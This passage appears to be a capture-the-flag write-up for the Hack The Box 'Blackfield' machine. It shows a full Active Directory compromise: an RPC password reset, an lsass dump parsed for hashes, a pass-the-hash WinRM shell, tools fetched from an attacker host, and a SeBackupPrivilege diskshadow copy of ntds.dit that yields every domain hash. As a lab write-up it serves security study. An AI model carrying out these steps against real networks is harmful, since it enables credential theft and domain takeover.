kali@kali:~/Desktop/htb/blackfield$ crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
kali@kali:~/Desktop/htb/blackfield$ crackmapexec winrm 10.10.10.192 -u support -p '#00^BlackKnight'
WINRM       10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [-] BLACKFIELD\support:#00^BlackKnight "Failed to authenticate the user support with ntlm"
```
We at least have some more SMB access.

### 4. Enumerate again
```bash
kali@kali:~/Desktop/htb/blackfield$ crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
```
For some reason I can't actually login to read these shares, so for now I move on to RPC, which I can login to.
```bash
kali@kali:~/Desktop/htb/blackfield$ rpcclient -U support 10.10.10.192
Enter WORKGROUP\support's password: 
rpcclient $> domenumusers
command not found: domenumusers
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[audit2020] rid:[0x44f]
user:[support] rid:[0x450]
user:[BLACKFIELD764430] rid:[0x451]
...
user:[BLACKFIELD996878] rid:[0x582]
user:[BLACKFIELD653097] rid:[0x583]
user:[BLACKFIELD438814] rid:[0x584]
user:[svc_backup] rid:[0x585]
user:[lydericlefebvre] rid:[0x586]
```
This provides one new user, lydericlefebvre, which gets added to the username list.  
Domain groups:
```bash
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
```
Support user query:
```bash
rpcclient $> queryuser support
        User Name   :   support
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Mon, 21 Sep 2020 18:33:33 EDT
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
        Password last set Time   :      Sun, 23 Feb 2020 12:53:24 EST
        Password can change Time :      Mon, 24 Feb 2020 12:53:24 EST
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x450
        group_rid:      0x201
        acb_info :      0x00010210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000008
        padding1[0..7]...
        logon_hrs[0..21]...
```
Support Privileges
```bash
rpcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege          0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
SeLockMemoryPrivilege           0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
SeMachineAccountPrivilege               0:6 (0x0:0x6)
SeTcbPrivilege          0:7 (0x0:0x7)
SeSecurityPrivilege             0:8 (0x0:0x8)
SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
SeLoadDriverPrivilege           0:10 (0x0:0xa)
SeSystemProfilePrivilege                0:11 (0x0:0xb)
SeSystemtimePrivilege           0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)
SeCreatePagefilePrivilege               0:15 (0x0:0xf)
SeCreatePermanentPrivilege              0:16 (0x0:0x10)
SeBackupPrivilege               0:17 (0x0:0x11)
SeRestorePrivilege              0:18 (0x0:0x12)
SeShutdownPrivilege             0:19 (0x0:0x13)
SeDebugPrivilege                0:20 (0x0:0x14)
SeAuditPrivilege                0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
SeUndockPrivilege               0:25 (0x0:0x19)
SeSyncAgentPrivilege            0:26 (0x0:0x1a)
SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
SeManageVolumePrivilege                 0:28 (0x0:0x1c)
SeImpersonatePrivilege          0:29 (0x0:0x1d)
SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)
SeRelabelPrivilege              0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
SeTimeZonePrivilege             0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
````
This seems like a lot of privileges given to this account, in particular some ones that catch my eye are "SeTrustedCredManAccessPrivilege" and "SeAuditPrivilege". As this accuont is named support it would be understandable for it to have some increased control over other accounts in the domain. Using RPC client, it might be possible to reset or change the password of a domain account to get access to that account.

### 5. Access another account
Reference: https://malicious.link/post/2017/reset-ad-user-password-with-linux/  
I can target the user "audit2020" and attempt to change their account password via RPC.
```bash
rpcclient $> setuserinfo2 audit2020 23 'P@ssword123!'
rpcclient $> 
```
No error is a good sign. Now I will try to enumerate shares with CME.
```bash
kali@kali:~/Desktop/htb/blackfield$ crackmapexec smb 10.10.10.192 -u audit2020 -p 'P@ssword123!' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:P@ssword123! 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
```
I can now try and access the forensics share.
```bash
kali@kali:~/Desktop/htb/blackfield$ smbclient \\\\BLACKFIELD.local\\forensic -U audit2020
Enter WORKGROUP\audit2020's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                7846143 blocks of size 4096. 4002829 blocks available
```
Checking out the memory_analysis folder, there is what appears to be some process dumps in zip files. In particular there are a few sensitive ones known to contain user credentials such as lsass.
```bash
smb: \> cd memory_analysis
smb: \memory_analysis\> ls
  .                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020

                7846143 blocks of size 4096. 4002829 blocks available
```
Unfortunately I can't seem to download any of the files using smbclient this way.
```bash
smb: \memory_analysis\> get lsass.zip
parallel_read returned NT_STATUS_IO_TIMEOUT
smb: \memory_analysis\>
```
To attempt to fix this I'll mount the share and then pull down the lsass.zip file to check that one out.
```bash
kali@kali:~/Desktop/htb/blackfield/audit2020_smb$ mkdir /tmp/smb
kali@kali:~/Desktop/htb/blackfield/audit2020_smb$ sudo mount -o username=audit2020 //10.10.10.192/forensic /mnt/audit2020/
🔐 Password for audit2020@//10.10.10.192/forensic:  ************            
kali@kali:~/Desktop/htb/blackfield/audit2020_smb$ cd /mnt/audit2020/
kali@kali:/mnt/audit2020$ ls
commands_output  memory_analysis  tools
kali@kali:/mnt/audit2020$ cd memory_analysis/
kali@kali:/mnt/audit2020/memory_analysis$ ls
conhost.zip  ctfmon.zip  dfsrs.zip  dllhost.zip  ismserv.zip  lsass.zip  mmc.zip  RuntimeBroker.zip  ServerManager.zip  sihost.zip  smartscreen.zip  svchost.zip  taskhostw.zip  winlogon.zip  wlms.zip  WmiPrvSE.zip
kali@kali:/mnt/audit2020/memory_analysis$ cp lsass.zip ~/Desktop/htb/blackfield/audit2020_smb/
kali@kali:/mnt$ sudo umount /mnt/audit2020
```
This works. Inside the lsass.zip file is a lsass.DMP, which is great news. I can then use pypykatz to extract credentials out of it (see lsass_extracted.txt).
```bash
kali@kali:~/Desktop/htb/blackfield/audit2020_smb$ pypykatz lsa minidump lsass.DMP > lsass_extracted.txt
INFO:root:Parsing file lsass.DMP
```
This gives me a username and NTLM hash: `svc_backup:9658d1d1dcd9250115e2205d9f48400d`.

### 6. Get a shell
```bash
kali@kali:~/Desktop/htb/blackfield$ crackmapexec smb 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup 9658d1d1dcd9250115e2205d9f48400d 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$          READ            Remote Admin
SMB         10.10.10.192    445    DC01             C$              READ,WRITE      Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 

kali@kali:~/Desktop/htb/blackfield$ crackmapexec winrm 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
WINRM       10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
```
I can now access the C$ share from the svc_backup account, which is cool, but I can also login to the machine using WinRM, which is better.
```bash
kali@kali:~/Desktop/htb/blackfield$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup
```

### 6. Enumerate from user account
Get some basic information about the machine.
```bash
*Evil-WinRM* PS C:\Users\svc_backup\Music\jib1337> Get-ComputerInfo


WindowsBuildLabEx                                       : 17763.1.amd64fre.rs5_release.180914-1434
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : ServerStandard
WindowsInstallationType                                 : Server
WindowsInstallDateFromRegistry                          : 2/1/2020 7:04:40 PM
WindowsProductId                                        : 00429-00521-62775-AA435
WindowsProductName                                      : Windows Server 2019 Standard
WindowsRegisteredOrganization                           :
WindowsRegisteredOwner                                  : Windows User
WindowsSystemRoot                                       : C:\Windows
WindowsVersion                                          : 1809
```
Drop winPEAS and run it.
```bash
*Evil-WinRM* PS C:\Users\svc_backup\Music\jib1337> wget -Uri http://10.10.15.158:8000/winPEAS.exe -OutFile peas.exe
*Evil-WinRM* PS C:\Users\svc_backup\Music\jib1337> ./peas.exe
Program 'peas.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ ./peas.exe
+ ~~~~~~~~~~.
At line:1 char:1
+ ./peas.exe
+ ~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```
Ah. Whoops. Guess not. Lets try some net commands then.
```bash
*Evil-WinRM* PS C:\Users\svc_backup\Music\jib1337> net user svc_backup
User name                    svc_backup
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2020 10:54:48 AM
Password expires             Never
Password changeable          2/24/2020 10:54:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/23/2020 11:03:50 AM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Music\jib1337> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
In addition I can do some exploration of the file system.
```bash
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/21/2020   3:58 PM                f
d-----        5/26/2020   5:38 PM                PerfLogs
d-----         6/3/2020   9:47 AM                profiles
d-r---        3/19/2020  11:08 AM                Program Files
d-----         2/1/2020  11:05 AM                Program Files (x86)
d-r---        2/23/2020   9:16 AM                Users
d-----        9/21/2020   4:29 PM                Windows
-a----        2/28/2020   4:36 PM            447 notes.txt


*Evil-WinRM* PS C:\> cat notes.txt
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup & restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
```
All these mentions of backups throughout the enumeration process leads me to research into backup privilege escalation. I found this (very good) presentation of how various privileges within Windows can be abused: https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf, and one of the methods explored is using a backup application to backup the Windows NTDS.dit file to an accessible location. To do it I need access to a backup tool, either wbadmin.exe or diskshadow.exe. Of these, the diskshadow method is a little more well-documented.

### 7. Escalate privileges
References:
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#using-diskshadow-a-windows-signed-binary
- https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html#-sebackupprivlege---dump-ntdsdit
  
First thing I'll do is grab the SYSTEM hive. This is the easiest step.
```bash
*Evil-WinRM* PS C:\Users\svc_backup\Links\jib1337> reg.exe save hklm\system C:\Users\svc_backup\Links\jib1337\system.bak
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Links\jib1337> download system.bak
Info: Downloading C:\Users\svc_backup\Links\jib1337\system.bak to system.bak

                                                             
Info: Download successful!
```
Next step I need to load some dlls that will allow me to extract the NTDS from the volume shadow copy. I also create the diskshadow script like so:
```sh
set context persistent nowriters  
set metadata C:\Users\svc_backup\Links\jib1337\metadata.cab  
add volume C: alias someAlias  
create  
expose %someAlias% K:
```
Note that for some reason each line needs a space at the end of it, as the app seems to parse each line one character short. The DLLs were taken from: https://github.com/giuliano108/SeBackupPrivilege.  
Copy everything over:
```bash
*Evil-WinRM* PS C:\Users\svc_backup\Links\jib1337> wget http://10.10.15.158:8000/SeBackupPrivilegeCmdLets.dll -OutFile SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\svc_backup\Links\jib1337> wget http://10.10.15.158:8000/SeBackupPrivilegeUtils.dll -OutFile SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\svc_backup\Links\jib1337> wget http://10.10.15.158:8000/diskshadow.txt -OutFile diskshadow.txt
```
Import the DLLs and set the privilege:
```bash
*Evil-WinRM* PS C:\Users\svc_backup\Links\jib1337> Import-Module ./SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\svc_backup\Links\jib1337> Import-Module ./SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\svc_backup\Links\jib1337> Set-SeBackupPrivilege
*Evil-WinRM* PS C:\Users\svc_backup\Links\jib1337> whoami /priv | findstr Backup
SeBackupPrivilege             Back up files and directories  Enabled
```
Time to make the shadow copy.
```bash
*Evil-WinRM* PS C:\Users\svc_backup\Links\jib1337> cd \Windows\system32
*Evil-WinRM* PS C:\Windows\system32> diskshadow -s C:\Users\svc_backup\Links\jib1337\diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  9/30/2020 8:46:45 AM

-> set context persistent nowriters
-> set metadata C:\Users\svc_backup\Links\jib1337\metadata.cab
The existing file will be overwritten.
-> add volume C: alias someAlias
-> create
Alias someAlias for shadow ID {0872fcaf-ceab-4999-b7da-e4c5575876d1} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {9fdb069a-80bd-4682-80d9-08c2e4e07378} set as environment variable.

Querying all shadow copies with the shadow copy set ID {9fdb069a-80bd-4682-80d9-08c2e4e07378}

        * Shadow copy ID = {0872fcaf-ceab-4999-b7da-e4c5575876d1}               %someAlias%
                - Shadow copy set: {9fdb069a-80bd-4682-80d9-08c2e4e07378}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 9/30/2020 8:46:46 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy9
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %someAlias% K:
-> %someAlias% = {0872fcaf-ceab-4999-b7da-e4c5575876d1}
The shadow copy was successfully exposed as K:\.
->
*Evil-WinRM* PS C:\Windows\system32> ls K:\


    Directory: K:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/21/2020   3:58 PM                f
d-----        5/26/2020   5:38 PM                PerfLogs
d-----         6/3/2020   9:47 AM                profiles
d-r---        3/19/2020  11:08 AM                Program Files
d-----         2/1/2020  11:05 AM                Program Files (x86)
d-r---        2/23/2020   9:16 AM                Users
d-----        9/21/2020   4:29 PM                Windows
-a----        2/28/2020   4:36 PM            447 notes.txt
```
Looking good. Now if my privileges are working I should be able to extract the ntds.dit file back to my directory, then it can be downloaded.
```bash
*Evil-WinRM* PS C:\Users\svc_backup\Links\jib1337> Copy-FileSeBackupPrivilege K:\Windows\ntds\ntds.dit C:\Users\svc_backup\Links\jib1337\ntds.dit
*Evil-WinRM* PS C:\Users\svc_backup\Links\jib1337> ls


    Directory: C:\Users\svc_backup\Links\jib1337


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/30/2020   8:46 AM            162 diskshadow.txt
-a----        9/30/2020   8:46 AM            690 metadata.cab
-a----        9/30/2020   8:51 AM       18874368 ntds.dit
-a----        9/30/2020   8:39 AM          12288 SeBackupPrivilegeCmdLets.dll
-a----        9/30/2020   8:40 AM          16384 SeBackupPrivilegeUtils.dll


*Evil-WinRM* PS C:\Users\svc_backup\Links\jib1337> download ntds.dit
Info: Downloading C:\Users\svc_backup\Links\jib1337\ntds.dit to ntds.dit

                                                             
Info: Download successful!
```
Now dump the NDTS secrets.
```bash
kali@kali:~/Desktop/htb/blackfield$ gosecretsdump -system system.bak -ntds ntds.dit > ntdsdump.txt
kali@kali:~/Desktop/htb/blackfield$ cat ntdsdump.txt
gosecretsdump v0.3.0 (@C__Sto)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Administrator:aes256-cts-hmac-sha1-96:dbd84e6cf174af55675b4927ef9127a12aade143018c78fbbe568d394188f21f
Administrator:aes128-cts-hmac-sha1-96:8148b9b39b270c22aaa74476c63ef223
Administrator:des-cbc-md5:5d25a84ac8c229c1
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:9e3d10cc537937888adcc0d918813a24:::
DC01$:aes256-cts-hmac-sha1-96:9a1cbed11eac98cd2382509615cafd99f9ead2cc2e48352e269d5a05d50652bd
DC01$:aes128-cts-hmac-sha1-96:6e4e93262b357cf298c60538d6373f26
DC01$:des-cbc-md5:45f74a5861c2ec85
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
krbtgt:aes256-cts-hmac-sha1-96:bd31681b175bd44ddf68c064445ca4e510ba2115e106905bdfef6ef0ff66b32c
krbtgt:aes128-cts-hmac-sha1-96:676f63c263b8d482b271d091b2dde762
krbtgt:des-cbc-md5:fb4cb5761aef465d
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
audit2020:aes256-cts-hmac-sha1-96:bdeca8eb67c5e70984efdfb33defdfc15644408fb06e948df7dba6d1760e0c0e
audit2020:aes128-cts-hmac-sha1-96:5d1e1cb1fc6b59436fe9c9454c1d1608
audit2020:des-cbc-md5:c40701e67a10b673
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
support:aes256-cts-hmac-sha1-96:74574c46cab866ba40841f83b1226d429f6338fdf574f9a232ef551f9b7550c9
support:aes128-cts-hmac-sha1-96:19331e579612b1eb3356e8b5f0e2d890
support:des-cbc-md5:dfae341cef208f52
BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD764430:aes256-cts-hmac-sha1-96:7dcefd1338c5bcddd117c45a0b82fde8b8cd8353dd11933cfe258648d5ad0b35
BLACKFIELD.local\BLACKFIELD764430:aes128-cts-hmac-sha1-96:fadca38b7a1018e7b399ca49dec883f1
BLACKFIELD.local\BLACKFIELD764430:des-cbc-md5:377adac13770d083
...
```
Finally I can re-log to WinRM with the admin hash.
```bash
kali@kali:~/Desktop/htb/blackfield$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
```